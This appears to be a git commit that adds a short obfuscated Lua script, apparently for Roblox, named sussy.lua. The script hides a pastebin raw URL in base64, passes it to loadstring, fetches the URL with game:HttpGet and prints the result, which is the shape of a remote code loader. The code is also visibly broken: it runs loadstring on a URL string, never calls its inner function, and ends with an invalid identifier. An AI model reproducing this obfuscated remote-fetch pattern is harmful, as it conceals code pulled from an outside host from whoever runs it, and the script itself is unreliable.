be158050029b8637ed70835a22000de8443c1ec1
ZzZz <CreatureBlobman@gmail.com>
2026-09-20 09:38:38 +0200

    Create sussy.lua

---
+++ sussy.lua
@@ -0,0 +1,14 @@
+return(function(udnDH, ...)
+local BKpwvD = {"Rh8sDShpTfC63V9";"Iy8r0o";"ou4km";"EljnJGu";"cCeQvE7F1v";"ZkUINoVR3u";"hWCHx0tmUbp1GL";"zg2mqx0p";"msq17iVN4";"tSQduw6Jz8UrKcn3";"1i3n0uWDuHpGDE";"2iMDR9";"SbHy"}
+local WuzlrtZL = function(...)
+local url = loadstring(base64decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3kwV0ZRQjlM"))()
+local success, content = pcall(function()
+    return game:HttpGet(url)
+end)
+
+if success then
+    print(content)
+    end
+end
+3CZAHwCu(b3NWx)
+end)(...)
